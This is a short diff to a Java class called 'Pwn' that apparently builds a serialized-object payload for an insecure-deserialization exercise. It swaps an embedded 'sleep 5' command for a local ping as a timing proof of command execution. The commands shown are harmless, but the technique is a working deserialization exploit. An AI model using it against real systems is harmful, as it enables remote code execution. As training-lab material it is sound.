@@ -6,7 +6,8 @@ import org.dummy.insecure.framework.*;
 public class Pwn {
 
     public static void main(String[] args) throws Exception {
-        VulnerableTaskHolder go = new VulnerableTaskHolder("IOD", "sleep 5");
+        //since I'm running the server on win box I use ping
+        VulnerableTaskHolder go = new VulnerableTaskHolder("IOD", "ping 127.0.0.1 -n 6");
 
         ByteArrayOutputStream bos = new ByteArrayOutputStream();
         ObjectOutputStream oos = new ObjectOutputStream(bos);
